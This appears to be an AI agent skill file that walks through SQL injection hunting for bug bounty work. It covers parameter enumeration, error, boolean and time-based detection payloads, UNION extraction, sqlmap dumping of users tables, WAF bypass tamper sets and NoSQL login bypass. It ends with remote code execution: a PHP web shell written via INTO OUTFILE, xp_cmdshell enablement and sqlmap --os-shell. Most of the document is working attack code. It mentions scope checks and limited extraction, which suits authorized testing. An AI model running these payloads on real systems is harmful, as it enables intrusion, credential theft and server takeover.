---
name: sqli-hunter
description: Systematically hunt for SQL injection vulnerabilities across all injection surfaces: in-band (error-based, union-based), blind (boolean-based, time-based), out-of-band (DNS/HTTP exfiltration), second-order, and ORM/NoSQL injection. Covers manual detection, WAF fingerprinting and bypass, sqlmap configuration, and full exploitation chains from data extraction to RCE via INTO OUTFILE or xp_cmdshell. Use this skill whenever a target reflects database errors, accepts user input that may be interpolated into SQL queries, or uses a backend identified as MySQL, PostgreSQL, MSSQL, Oracle, or SQLite. Trigger on phrases like "sql injection", "sqli", "sqli-hunter", "test for injection", "database errors", or when recon reveals parameters named id, user, search, order, sort, category, filter, page, product, item, name, or any numeric/UUID parameter feeding a lookup endpoint.
---

# SQLi Hunter Skill

You are hunting for SQL injection. SQLi is one of the most consistently Critical findings in bug bounty — database read access = PII exfiltration, credentials, and internal secrets. Write access = data destruction or full server compromise via file write or OS command execution. The challenge in modern targets is that raw SQL errors are rare, WAFs are common, and ORMs provide partial protection. Your job is to probe intelligently, distinguish true positives from false positives, bypass WAF/filtering, and build the full extraction chain before submitting.

Run all phases in order. Phase 1 maps every injection surface. Phase 2 detects SQLi type. Phase 3 exploits in-band. Phase 4 handles blind. Phase 5 handles WAF bypass. Phase 6 covers second-order and ORM injection. Phase 7 builds the impact chain.

> **THINKING LLM DIRECTIVE — MAXIMUM EFFORT REQUIRED**
> If you are a reasoning/thinking model (o1, o3, Claude with extended thinking, Gemini with thinking, DeepSeek-R1, QwQ, or any model with a dedicated reasoning/thinking phase): **activate maximum thinking budget for this skill**. SQLi detection, WAF fingerprinting, payload construction for blind injection, and DBMS-specific exploitation require deep sequential reasoning. A single wrong assumption about the injection context or DBMS version wastes hours. Think fully before acting on every phase transition, every bypass attempt, and every extraction query. Do not truncate your reasoning.

---

## Prerequisites

- Burp Suite active with logging enabled
- sqlmap available at `/usr/bin/sqlmap` or `/home/kali/go/bin/sqlmap`
- OOB infrastructure (Burp Collaborator / interactsh) for out-of-band detection
- All assets confirmed IN SCOPE via `/scope-checker`

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/sqli
export OOB_URL="your-id.oast.fun"
export SESSION_COOKIE="[your auth cookie]"
export TARGET_DOMAIN="[target domain]"
```

---

## Phase 1 — Surface Enumeration

### Step 1.1 — Identify SQLi-Prone Parameters

```bash
SQLI_PARAMS="id|user_id|item_id|product_id|order_id|cat|category|page"
SQLI_PARAMS+="|search|q|query|filter|sort|order|orderby|sortby|group"
SQLI_PARAMS+="|name|title|username|email|token|key|ref|code|type|status"
SQLI_PARAMS+="|from|to|start|end|offset|limit|year|month|day|date|since"

grep -iEh "[?&](${SQLI_PARAMS})=[^&]+" \
  $TARGET_DIR/recon/api/all-endpoints.txt \
  $TARGET_DIR/recon/api/katana-crawl.txt 2>/dev/null | \
  sort -u > $TARGET_DIR/recon/sqli/candidate-params.txt

echo "[*] SQLi candidate parameters: $(wc -l < $TARGET_DIR/recon/sqli/candidate-params.txt)"
```

### Step 1.2 — Classify Surfaces by Priority

| Priority | Surface Type | Indicator |
|---|---|---|
| **Critical** | Numeric ID parameter (`?id=1`) | Direct row lookup, common raw SQL |
| **Critical** | Search / filter with ORDER BY | Often raw `ORDER BY $col $dir` interpolation |
| **High** | Login form (username/password) | Authentication bypass vector |
| **High** | UUID/GUID parameter | May still be interpolated unsafely |
| **High** | JSON body parameters to API | ORM may use raw queries for performance |
| **Medium** | String parameters (name, query) | Often parameterized but worth testing |
| **Low** | Parameters with visible encoding | Likely sanitized/encoded pipeline |

```bash
grep -iE '[?&](id|item_id|user_id|product_id|order_id|cat_id)=[0-9]+' \
  $TARGET_DIR/recon/sqli/candidate-params.txt | \
  sort -u > $TARGET_DIR/recon/sqli/numeric-id-params.txt

echo "[*] Numeric ID params (highest priority): $(wc -l < $TARGET_DIR/recon/sqli/numeric-id-params.txt)"
```

### Step 1.3 — HTTP Header Injection Surfaces

Many applications log or process HTTP headers and insert them into queries unsanitized:

```bash
HEADER_SURFACES=(
  "X-Forwarded-For" "X-Real-IP" "User-Agent" "Referer"
  "X-Forwarded-Host" "X-Custom-IP-Authorization"
  "X-Remote-IP" "X-Originating-IP"
)

for HEADER in "${HEADER_SURFACES[@]}"; do
  RESPONSE=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://$TARGET_DOMAIN/" \
    -H "Cookie: $SESSION_COOKIE" \
    -H "${HEADER}: '" \
    --max-time 8)
  echo "[$RESPONSE] $HEADER: '"
done | tee $TARGET_DIR/recon/sqli/header-probe.txt
# 500 response to single quote in a header = strong candidate
```

---

## Phase 2 — Detection and Type Classification

### Step 2.1 — Error-Based Detection

```bash
while IFS= read -r ENDPOINT; do
  PARAM=$(echo "$ENDPOINT" | grep -oP '(?<=[?&])[^=]+(?==)' | head -1)
  BASE=$(echo "$ENDPOINT" | sed 's/[?&][^?&]*$//')
  ORIG_VAL=$(echo "$ENDPOINT" | grep -oP "(?<=${PARAM}=)[^&]+" | head -1)

  RESP_SQ=$(curl -sk \
    -G "$BASE" --data-urlencode "${PARAM}=${ORIG_VAL}'" \
    -H "Cookie: $SESSION_COOKIE" --max-time 10)

  if echo "$RESP_SQ" | grep -iqE \
    '(sql syntax|mysql_fetch|pg_query|ORA-[0-9]+|sqlite_|ODBC|DB2|Sybase|
      syntax error|unclosed quotation|unterminated string|quoted string not properly|
      You have an error in your SQL|Warning.*mysql|Division by zero|
      supplied argument is not|invalid query|unexpected end of SQL|
      SQLSTATE|PDOException|java\.sql\.|System\.Data\.SqlClient|
      Microsoft OLE DB|ADODB\.Field|Incorrect syntax near|
      Unclosed quotation mark|quoted string not properly terminated)'; then
    echo "[ERROR-BASED CANDIDATE] $PARAM in $BASE"
    echo "$ENDPOINT" >> $TARGET_DIR/recon/sqli/error-based-candidates.txt
  fi
done < $TARGET_DIR/recon/sqli/candidate-params.txt

echo "[*] Error-based candidates: $(wc -l < $TARGET_DIR/recon/sqli/error-based-candidates.txt 2>/dev/null || echo 0)"
```

### Step 2.2 — Boolean-Based Blind Detection

```bash
PARAM="id"
BASE_URL="https://$TARGET_DOMAIN/api/item"
ORIG="1"

RESP_ORIG=$(curl -sk -G "$BASE_URL" --data-urlencode "${PARAM}=${ORIG}" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10)
RESP_TRUE=$(curl -sk -G "$BASE_URL" --data-urlencode "${PARAM}=${ORIG} AND 1=1" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10)
RESP_FALSE=$(curl -sk -G "$BASE_URL" --data-urlencode "${PARAM}=${ORIG} AND 1=2" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10)

SIZE_ORIG=$(echo "$RESP_ORIG" | wc -c)
SIZE_TRUE=$(echo "$RESP_TRUE" | wc -c)
SIZE_FALSE=$(echo "$RESP_FALSE" | wc -c)

echo "Orig: $SIZE_ORIG | True(1=1): $SIZE_TRUE | False(1=2): $SIZE_FALSE"
# TRUE ≈ ORIG and FALSE ≠ ORIG → boolean-based blind SQLi confirmed
```

### Step 2.3 — Time-Based Blind Detection

```bash
TIME_PAYLOADS=(
  # MySQL
  "1 AND SLEEP(5)--"
  "1' AND SLEEP(5)--"
  "1 AND SLEEP(5)#"
  # PostgreSQL
  "1; SELECT pg_sleep(5)--"
  "1' AND (SELECT 1 FROM pg_sleep(5))--"
  # MSSQL
  "1; WAITFOR DELAY '0:0:5'--"
  "1' WAITFOR DELAY '0:0:5'--"
  # Oracle
  "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
  # SQLite
  "1 AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--"
)

for PAYLOAD in "${TIME_PAYLOADS[@]}"; do
  START=$(date +%s%3N)
  curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${PAYLOAD}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 15 > /dev/null
  END=$(date +%s%3N)
  ELAPSED=$(( END - START ))
  if [ "$ELAPSED" -ge 4500 ]; then
    echo "[TIME-BASED HIT ${ELAPSED}ms] $PAYLOAD"
    echo "$PAYLOAD" >> $TARGET_DIR/recon/sqli/time-based-hits.txt
  else
    echo "[${ELAPSED}ms] $PAYLOAD"
  fi
done
```

### Step 2.4 — DBMS Fingerprinting

Once injection is confirmed, identify the DBMS for targeted exploitation:

```bash
# Use error messages or boolean-based version checks
# MySQL: VERSION() contains '5.' or '8.'
# PostgreSQL: VERSION() contains 'PostgreSQL'
# MSSQL: @@VERSION contains 'Microsoft SQL Server'
# Oracle: v$version

# Boolean fingerprint via DBMS-specific function
FINGERPRINT_PAYLOADS=(
  # MySQL — returns true only on MySQL
  "1 AND SUBSTRING(@@version,1,1)='5'--"
  "1 AND SUBSTRING(@@version,1,1)='8'--"
  # PostgreSQL
  "1 AND SUBSTRING(version(),1,10)='PostgreSQL'--"
  # MSSQL
  "1 AND SUBSTRING(@@version,1,9)='Microsoft'--"
  # Oracle
  "1 AND (SELECT COUNT(*) FROM v\$version WHERE banner LIKE 'Oracle%')=1--"
)

for PAYLOAD in "${FINGERPRINT_PAYLOADS[@]}"; do
  SIZE=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${PAYLOAD}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 10 | wc -c)
  echo "[$SIZE bytes] $PAYLOAD"
done
# Payload returning size closest to ORIG indicates the DBMS
```

---

## Phase 3 — In-Band Exploitation

### Step 3.1 — UNION-Based Column Count Discovery

```bash
# Increment ORDER BY until error to find column count
for i in $(seq 1 20); do
  RESULT=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=1 ORDER BY ${i}--" \
    -H "Cookie: $SESSION_COOKIE" --max-time 10)
  if echo "$RESULT" | grep -iqE '(error|unknown column|order by|ORA-)'; then
    echo "[*] Column count is: $(( i - 1 ))"
    COLUMNS=$(( i - 1 ))
    break
  else
    echo "[OK] ORDER BY $i"
  fi
done
```

```bash
# Confirm with UNION SELECT NULL,NULL,...
# Build NULL string matching column count
NULLS=$(python3 -c "print(','.join(['NULL']*$COLUMNS))")

UNION_TEST=$(curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=0 UNION SELECT ${NULLS}--" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10)
echo "$UNION_TEST" | head -20
```

### Step 3.2 — Find Reflected Column Position

```bash
# Replace NULLs one-by-one with a canary string to find which column is reflected
for i in $(seq 1 $COLUMNS); do
  NULLS_ARR=()
  for j in $(seq 1 $COLUMNS); do
    if [ $j -eq $i ]; then
      NULLS_ARR+=("'SQLICANARY'")
    else
      NULLS_ARR+=("NULL")
    fi
  done
  PAYLOAD="0 UNION SELECT $(IFS=,; echo "${NULLS_ARR[*]}")--"
  RESULT=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${PAYLOAD}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 10)
  if echo "$RESULT" | grep -q "SQLICANARY"; then
    echo "[*] Column $i is reflected in response"
    REFLECTED_COL=$i
    break
  fi
done
```

### Step 3.3 — Data Extraction via UNION

```bash
# Build extraction query using the reflected column position
# Replace column $REFLECTED_COL with the data to extract

# MySQL: extract DB name, version, user
EXTRACT_QUERY="0 UNION SELECT "
for j in $(seq 1 $COLUMNS); do
  if [ $j -eq $REFLECTED_COL ]; then
    EXTRACT_QUERY+="CONCAT(database(),'|',version(),'|',user())"
  else
    EXTRACT_QUERY+="NULL"
  fi
  [ $j -lt $COLUMNS ] && EXTRACT_QUERY+=","
done
EXTRACT_QUERY+="--"

RESULT=$(curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=${EXTRACT_QUERY}" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10)
echo "[DB INFO] $RESULT" | grep -oE '[a-zA-Z0-9_]+\|[^\s<"]+' | head -5
```

```bash
# MySQL: dump all table names from information_schema
TABLES_QUERY="0 UNION SELECT "
TABLES_PAYLOAD="GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()"
for j in $(seq 1 $COLUMNS); do
  if [ $j -eq $REFLECTED_COL ]; then
    TABLES_QUERY+="($TABLES_PAYLOAD)"
  else
    TABLES_QUERY+="NULL"
  fi
  [ $j -lt $COLUMNS ] && TABLES_QUERY+=","
done
TABLES_QUERY+="--"

curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=${TABLES_QUERY}" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10 | \
  grep -oE '[a-z_A-Z0-9]+(,[a-z_A-Z0-9]+)+' | head -3
```

---

## Phase 4 — Blind Exploitation

### Step 4.1 — sqlmap for Blind SQLi

Once blind injection is confirmed manually, use sqlmap for automated extraction. **Always configure sqlmap conservatively** to avoid triggering WAF or overwhelming the target:

```bash
# Basic sqlmap invocation — GET parameter
sqlmap -u "https://$TARGET_DOMAIN/api/item?${PARAM}=1" \
  --cookie="$SESSION_COOKIE" \
  --level=3 --risk=2 \
  --dbms=mysql \
  --batch \
  --random-agent \
  --delay=1 \
  --timeout=15 \
  --retries=2 \
  --output-dir=$TARGET_DIR/recon/sqli/sqlmap/ \
  -p "$PARAM"
```

```bash
# POST body injection
sqlmap -u "https://$TARGET_DOMAIN/api/login" \
  --data="username=admin&password=test" \
  --cookie="$SESSION_COOKIE" \
  --level=3 --risk=2 \
  --batch --random-agent --delay=1 \
  --output-dir=$TARGET_DIR/recon/sqli/sqlmap/ \
  -p "username"
```

```bash
# JSON body injection
sqlmap -u "https://$TARGET_DOMAIN/api/search" \
  --data='{"query":"test"}' \
  -H "Content-Type: application/json" \
  --cookie="$SESSION_COOKIE" \
  --level=3 --risk=2 \
  --batch --random-agent --delay=1 \
  --output-dir=$TARGET_DIR/recon/sqli/sqlmap/
```

```bash
# Once injection confirmed, extract data
sqlmap -u "https://$TARGET_DOMAIN/api/item?${PARAM}=1" \
  --cookie="$SESSION_COOKIE" \
  --dbms=mysql --batch --random-agent --delay=1 \
  --output-dir=$TARGET_DIR/recon/sqli/sqlmap/ \
  --dbs                          # list databases

sqlmap -u "https://$TARGET_DOMAIN/api/item?${PARAM}=1" \
  --cookie="$SESSION_COOKIE" \
  --dbms=mysql --batch --random-agent --delay=1 \
  -D [dbname] --tables           # list tables in target DB

sqlmap -u "https://$TARGET_DOMAIN/api/item?${PARAM}=1" \
  --cookie="$SESSION_COOKIE" \
  --dbms=mysql --batch --random-agent --delay=1 \
  -D [dbname] -T users --dump    # dump users table
```

### Step 4.2 — Manual Boolean Extraction (No sqlmap)

For WAF-protected targets where sqlmap is blocked, extract data manually character by character:

```bash
# Extract first character of database name
# TRUE: response size matches ORIG; FALSE: response is different/empty

TARGET_QUERY="database()"

for CHAR_CODE in $(seq 97 122) $(seq 48 57) 95; do
  CHAR=$(python3 -c "print(chr($CHAR_CODE))")
  PAYLOAD="1 AND SUBSTRING(${TARGET_QUERY},1,1)='${CHAR}'--"
  SIZE=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${PAYLOAD}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 10 | wc -c)
  echo "[$SIZE] char='$CHAR'"
done
# The character whose response size matches ORIG is the first character
```

---

## Phase 5 — WAF Detection and Bypass

### Step 5.1 — Fingerprint WAF

```bash
# Common WAF fingerprints in response headers and bodies
curl -sk -I "https://$TARGET_DOMAIN/?id=1'" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10 | \
  grep -iE '(cloudflare|akamai|sucuri|incapsula|imperva|f5|barracuda|
             mod_security|x-waf|x-firewall|server:.*waf|x-protected-by)'

# Body-based WAF detection
curl -sk "https://$TARGET_DOMAIN/?id=1'" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10 | \
  grep -iE '(blocked|firewall|forbidden|access denied|waf|security|
             cloudflare|request id|ray id|incident)'
```

### Step 5.2 — WAF Bypass Techniques

Apply bypass techniques based on what the WAF is filtering:

**Keyword casing and comment insertion:**
```sql
-- WAF blocks: UNION SELECT
-- Bypasses:
UNiOn SeLeCt
UNION/**/SELECT
UN/**/ION/**/SE/**/LECT
UNION%20SELECT
UNION%09SELECT
UNION%0aSELECT
/*!UNION*/ /*!SELECT*/
```

**Encoding bypasses:**
```bash
# Double URL encoding
# UNION = %55%4e%49%4f%4e
curl -sk "https://$TARGET_DOMAIN/api/item?id=0%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20NULL--" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10

# Hex encoding for string literals (avoids quotes)
# 'admin' = 0x61646d696e
curl -sk -G "https://$TARGET_DOMAIN/api/item" \
  --data-urlencode "id=0 UNION SELECT 0x61646d696e,NULL--" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10
```

**Scientific notation for numeric bypass:**
```sql
-- WAF may not parse: 1e0 UNION SELECT...
1e0 UNION SELECT NULL,NULL--
1.0 UNION SELECT NULL,NULL--
```

**MySQL inline comments:**
```sql
/*!50000 UNION*/ /*!50000 SELECT*/ NULL,NULL--
```

**sqlmap tamper scripts for WAF bypass:**
```bash
sqlmap -u "https://$TARGET_DOMAIN/api/item?${PARAM}=1" \
  --cookie="$SESSION_COOKIE" \
  --tamper=space2comment,between,randomcase,charencode \
  --level=3 --risk=2 --batch --delay=2 \
  --output-dir=$TARGET_DIR/recon/sqli/sqlmap/

# Common tamper combinations:
# Cloudflare:    space2comment,between,randomcase
# ModSecurity:   charencode,space2comment,randomcase
# Imperva:       between,charencode,equaltolike
# Generic:       space2comment,between,randomcase,charencode,multiplespaces
```

---

## Phase 6 — Second-Order and ORM Injection

### Step 6.1 — Second-Order SQLi

Second-order SQLi occurs when user input is stored safely but later retrieved and used in an unsafe SQL query without sanitization:

```bash
# Pattern:
# 1. Input stored: INSERT INTO users (username) VALUES ('payload') -- stored safely
# 2. Later used: SELECT * FROM orders WHERE username = '$stored_value' -- unsafe

# Test: register or create a resource with a SQLi payload as the value
# Then trigger an action that reads and uses that stored value in a query

# Example: register user with SQLi username
curl -sk -X POST "https://$TARGET_DOMAIN/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''-- ", "password": "test123"}' \
  --max-time 10

# Then log in or perform an action that queries by username
curl -sk -X POST "https://$TARGET_DOMAIN/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''-- ", "password": "test123"}' \
  --max-time 10

# Watch for error messages or different behavior
echo "[MANUAL] Monitor for SQL errors or auth bypass on action that uses stored value"
```

### Step 6.2 — ORM Raw Query Detection

Modern ORMs (SQLAlchemy, Sequelize, Django ORM, ActiveRecord) are generally safe but often have escape hatches for raw queries. Look for these patterns in JS and API behavior:

```bash
# Signs that raw queries may be in use:
# 1. ORDER BY accepts column names (common raw interpolation)
# 2. Complex filter parameters (filter[field]=value)
# 3. GraphQL raw query arguments
# 4. Performance-critical endpoints that can't use ORM

# Test ORDER BY injection (extremely common)
for PAYLOAD in \
  "name" "name ASC" "name DESC" \
  "name,(SELECT SLEEP(3))--" \
  "name ASC,(SELECT 1 FROM(SELECT SLEEP(3))x)--" \
  "(CASE WHEN 1=1 THEN name ELSE price END)"; do
  START=$(date +%s%3N)
  SIZE=$(curl -sk -G "https://$TARGET_DOMAIN/api/products" \
    --data-urlencode "sort=${PAYLOAD}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 10 | wc -c)
  ELAPSED=$(( $(date +%s%3N) - START ))
  echo "[${ELAPSED}ms | ${SIZE}b] sort=$PAYLOAD"
done
```

### Step 6.3 — NoSQL Injection (MongoDB / CouchDB)

If the backend uses MongoDB or another NoSQL DB, test for NoSQL injection:

```bash
# MongoDB operator injection — replace string with object
# Normal: {"username": "admin", "password": "secret"}
# Attack: {"username": "admin", "password": {"$ne": ""}}

# Test via JSON body
curl -sk -X POST "https://$TARGET_DOMAIN/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": ""}}' \
  --max-time 10

# Test via URL parameter (PHP-style array notation)
curl -sk "https://$TARGET_DOMAIN/api/login?username=admin&password[$ne]=" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10

# Test $gt, $regex operators
curl -sk -X POST "https://$TARGET_DOMAIN/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": "adm.*"}, "password": {"$gt": ""}}' \
  --max-time 10
```

---

## Phase 7 — Impact Chain and Escalation

### Step 7.1 — Extract High-Value Data

```bash
# Target tables to prioritize (MySQL example)
HIGH_VALUE_TABLES=(
  "users" "admin" "administrators" "accounts" "customers"
  "credentials" "passwords" "auth_tokens" "api_keys" "secrets"
  "sessions" "oauth_tokens" "payment_methods" "credit_cards"
)

# sqlmap targeted dump
for TABLE in "${HIGH_VALUE_TABLES[@]}"; do
  # Check if table exists
  EXISTS=$(sqlmap -u "https://$TARGET_DOMAIN/api/item?${PARAM}=1" \
    --cookie="$SESSION_COOKIE" --dbms=mysql --batch --silent \
    -D $(cat $TARGET_DIR/recon/sqli/sqlmap/*/log 2>/dev/null | grep "current database" | tail -1 | awk '{print $NF}') \
    -T "$TABLE" --count 2>/dev/null | grep -oE '[0-9]+ entries')
  [ -n "$EXISTS" ] && echo "[FOUND] $TABLE: $EXISTS"
done
```

### Step 7.2 — File Read (MySQL / PostgreSQL)

```bash
# MySQL: read /etc/passwd via LOAD_FILE (requires FILE privilege)
FILE_PAYLOAD="0 UNION SELECT LOAD_FILE('/etc/passwd')"
for j in $(seq 1 $COLUMNS); do
  [ $j -eq $REFLECTED_COL ] || FILE_PAYLOAD+=",NULL"
done

curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=${FILE_PAYLOAD}--" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10 | \
  grep -oE 'root:[^<"]+' | head -5

# PostgreSQL: pg_read_file (requires superuser)
# SELECT pg_read_file('/etc/passwd')

# sqlmap file read
sqlmap -u "https://$TARGET_DOMAIN/api/item?${PARAM}=1" \
  --cookie="$SESSION_COOKIE" --dbms=mysql --batch \
  --file-read="/etc/passwd" \
  --output-dir=$TARGET_DIR/recon/sqli/sqlmap/
```

### Step 7.3 — RCE via File Write (MySQL INTO OUTFILE)

```bash
# Requires: FILE privilege, knowledge of webroot path, no secure_file_priv restriction
# Test: write a probe file
WEBROOT="/var/www/html"
SHELL_PAYLOAD="0 UNION SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '${WEBROOT}/sqli-shell.php'--"

curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=${SHELL_PAYLOAD}" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10

# Verify write succeeded
curl -sk "https://$TARGET_DOMAIN/sqli-shell.php?cmd=id" --max-time 5

# sqlmap OS shell (--os-shell)
sqlmap -u "https://$TARGET_DOMAIN/api/item?${PARAM}=1" \
  --cookie="$SESSION_COOKIE" --dbms=mysql --batch \
  --os-shell \
  --output-dir=$TARGET_DIR/recon/sqli/sqlmap/
```

### Step 7.4 — RCE via MSSQL xp_cmdshell

```bash
# Enable xp_cmdshell if disabled (requires sysadmin)
ENABLE_PAYLOAD="1; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--"

curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=${ENABLE_PAYLOAD}" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10

# Execute OS command
CMD_PAYLOAD="1; EXEC xp_cmdshell 'whoami'--"
curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=${CMD_PAYLOAD}" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10

# sqlmap OS shell on MSSQL
sqlmap -u "https://$TARGET_DOMAIN/api/item?${PARAM}=1" \
  --cookie="$SESSION_COOKIE" --dbms=mssql --batch \
  --os-shell \
  --output-dir=$TARGET_DIR/recon/sqli/sqlmap/
```

### Step 7.5 — PoC Documentation Standard

```bash
cat >> $TARGET_DIR/findings/sqli-$(date +%Y%m%d-%H%M).md << 'EOF'
## SQLi Finding

**URL:** [exact vulnerable URL]
**Parameter:** [param name]
**HTTP Method:** GET / POST
**Injection Type:** Error-based / Boolean-blind / Time-based / UNION / Second-order
**DBMS:** MySQL / PostgreSQL / MSSQL / Oracle / SQLite
**WAF Present:** Yes / No — bypass method used: [if applicable]

**Detection Payload:**
```
[exact payload that confirmed injection]
```

**Response confirming injection:**
```
[error message OR size delta for boolean OR timing for time-based]
```

**Data extracted (PoC):**
```
[e.g. database name, version, first row of users table — enough to prove extraction, not a full dump]
```

**Impact:** Read access to [DB name] — contains [table names with PII/creds]
**Escalation path:** [File read / OS command execution if demonstrated]
EOF
```

---

## Output Summary

All output written to `$TARGET_DIR/recon/sqli/`:

| File | Contents |
|---|---|
| `candidate-params.txt` | All SQLi-prone parameters from recon |
| `numeric-id-params.txt` | Numeric ID params (highest priority) |
| `header-probe.txt` | HTTP header injection probe results |
| `error-based-candidates.txt` | Parameters that returned DB error on single-quote injection |
| `time-based-hits.txt` | Payloads that triggered ≥5s response delay |
| `sqlmap/` | sqlmap output directory — logs, results, dumps |

---

## Severity Reference

| Finding | Severity |
|---|---|
| SQLi with PII/credential extraction confirmed | Critical |
| SQLi with OS command execution (RCE) | Critical |
| SQLi with file read from server filesystem | Critical |
| SQLi in authentication endpoint (auth bypass) | Critical |
| SQLi — read access to DB confirmed, no sensitive data yet | High |
| Second-order SQLi requiring stored payload activation | High |
| NoSQL injection with authentication bypass | High |
| SQLi in low-privilege endpoint — DB version/schema only | Medium |
| Blind SQLi confirmed but no extraction attempted | Medium (pending) |
| SQL error message exposed without injection confirmation | Low–Informational |

---

## Guiding Principles

- **Error messages are leads, not findings.** A SQL error is a strong signal of a vulnerable parameter, but you need to demonstrate actual data extraction or behavioral difference to confirm injection. Error message alone is Informational on many programs.
- **Manual confirmation before sqlmap.** Always confirm the injection point manually (single quote + boolean conditions) before running sqlmap. Sqlmap against a false positive wastes time and generates noise.
- **Time-based blind is the most unreliable type.** Network jitter, server load, and query caching can all produce false positives. Always run the sleep payload at least 3 times and compare against a baseline. Do not claim time-based blind on a single 5s response.
- **WAF bypass is a skill test, not a blocker.** A WAF block on a naive payload does not mean the injection is unexploitable. Work the bypass ladder before ruling out SQLi on a parameter that showed a behavioral difference.
- **Second-order is underreported.** Registration forms, profile fields, and import functions that store data for later use are frequently vulnerable to second-order injection. The stored value is safe; the retrieval is not.
- **ORDER BY injection is the most common ORM escape.** Any endpoint that accepts a sort/order parameter and uses it to modify query order is a likely raw-query injection point. Test it first on any API that has sorting.
- **Extraction is the PoC — schema alone is insufficient.** Programs require demonstrated data access. Extract the DB name, version, and first row of a sensitive table (or a non-sensitive table with a count). Do not dump full tables.
- **Run /triager before submitting.** A SQL error message with no demonstrated injection is Informational. A boolean blind finding without a size-differential screenshot or data extraction sample is Low at best. Build the PoC to the extraction level before submitting.
